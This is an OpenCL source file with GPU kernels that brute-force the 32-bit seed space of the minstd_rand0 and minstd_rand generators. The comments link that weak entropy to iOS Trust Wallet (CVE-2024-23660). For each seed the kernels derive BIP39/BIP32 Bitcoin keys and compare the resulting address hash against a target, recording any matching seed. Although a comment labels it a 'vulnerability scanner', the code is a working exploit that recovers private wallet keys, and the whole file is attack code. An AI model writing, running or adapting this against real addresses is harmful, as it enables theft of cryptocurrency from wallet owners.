// minstd_rand0 Linear Congruential Generator
// Used by iOS Trust Wallet (CVE-2024-23660)
// Parameters: m = 2^31 - 1, a = 16807

#define MINSTD_M 2147483647UL  // 2^31 - 1
#define MINSTD_A 16807UL

uint minstd_rand0_next(uint* state) {
    // LCG: state = (a * state) mod m
    ulong next = ((ulong)MINSTD_A * (ulong)(*state)) % MINSTD_M;
    *state = (uint)next;
    return *state;
}

// Extract 128 bits of entropy using minstd_rand0
void minstd_extract_128(uint seed, __private uchar* entropy) {
    uint state = seed;
    // Initialize state properly
    if (state == 0) state = 1;  // Avoid zero state
    
    // Generate 16 bytes, one byte per call
    for (int i = 0; i < 16; i++) {
        uint val = minstd_rand0_next(&state);
        entropy[i] = val & 0xFF;  // LSB extraction
    }
}

// minstd_rand variant (a = 48271)
#define MINSTD_A2 48271UL

uint minstd_rand_next(uint* state) {
    ulong next = ((ulong)MINSTD_A2 * (ulong)(*state)) % MINSTD_M;
    *state = (uint)next;
    return *state;
}

void minstd_extract_128_v2(uint seed, __private uchar* entropy) {
    uint state = seed;
    if (state == 0) state = 1;
    
    for (int i = 0; i < 16; i++) {
        uint val = minstd_rand_next(&state);
        entropy[i] = val & 0xFF;
    }
}

// iOS Trust Wallet Vulnerability Scanner (CVE-2024-23660)
__kernel void ios_trust_wallet_crack(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint seed = gid;
    
    // Generate 128-bit entropy using minstd_rand0 (iOS PRNG)
    uchar entropy[16] __attribute__((aligned(4)));
    minstd_extract_128(seed, entropy);
    
    // BIP39: Entropy → Seed
    uchar bip_seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete(entropy, bip_seed);
    
    // BIP32: Master Key
    extended_private_key_t master_key;
    new_master_from_seed(0, bip_seed, &master_key);
    
    // Derive m/44'/0'/0'/0/0
    extended_private_key_t purpose_key;
    hardened_private_child_from_private(&master_key, &purpose_key, 44);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&purpose_key, &coin_key, 0);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&coin_key, &account_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&account_key, &external_key, 0);
    
    extended_private_key_t address_key;
    normal_private_child_from_private(&external_key, &address_key, 0);
    
    // Get public key
    extended_public_key_t address_pub;
    public_from_private(&address_key, &address_pub);
    
    // Generate Hash160
    uchar hash160[20];
    identifier_for_public_key(&address_pub, hash160);
    
    // Pack and compare
    ulong h1 = 0, h2 = 0;
    uint h3 = 0;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
    
    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024) {
            results[idx] = seed;
        }
    }
}

// minstd_rand (a=48271) vulnerability scanner
// Alternate LCG variant - different from minstd_rand0 (a=16807)
__kernel void minstd_rand_crack(
    __global ulong* results,
    __global uint* result_count,
    ulong target_h160_part1,
    ulong target_h160_part2,
    uint target_h160_part3,
    uint offset
) {
    uint gid = get_global_id(0) + offset;
    uint seed = gid;
    
    // Generate 128-bit entropy using minstd_rand (a=48271)
    uchar entropy[16] __attribute__((aligned(4)));
    minstd_extract_128_v2(seed, entropy);
    
    // BIP39: Entropy -> Seed
    uchar bip_seed[64] __attribute__((aligned(8)));
    bip39_entropy_to_seed_complete(entropy, bip_seed);
    
    // BIP32: Master Key -> m/44'/0'/0'/0/0
    extended_private_key_t master_key;
    new_master_from_seed(0, bip_seed, &master_key);
    
    extended_private_key_t purpose_key;
    hardened_private_child_from_private(&master_key, &purpose_key, 44);
    
    extended_private_key_t coin_key;
    hardened_private_child_from_private(&purpose_key, &coin_key, 0);
    
    extended_private_key_t account_key;
    hardened_private_child_from_private(&coin_key, &account_key, 0);
    
    extended_private_key_t external_key;
    normal_private_child_from_private(&account_key, &external_key, 0);
    
    extended_private_key_t address_key;
    normal_private_child_from_private(&external_key, &address_key, 0);
    
    extended_public_key_t address_pub;
    public_from_private(&address_key, &address_pub);
    
    uchar hash160[20];
    identifier_for_public_key(&address_pub, hash160);
    
    ulong h1 = 0, h2 = 0;
    uint h3 = 0;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i]) << (i*8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i+8]) << (i*8);
    for (int i = 0; i < 4; i++) h3 |= ((uint)hash160[i+16]) << (i*8);
    
    if (h1 == target_h160_part1 && h2 == target_h160_part2 && h3 == target_h160_part3) {
        uint idx = atomic_inc(result_count);
        if (idx < 1024) {
            results[idx] = seed;
        }
    }
}
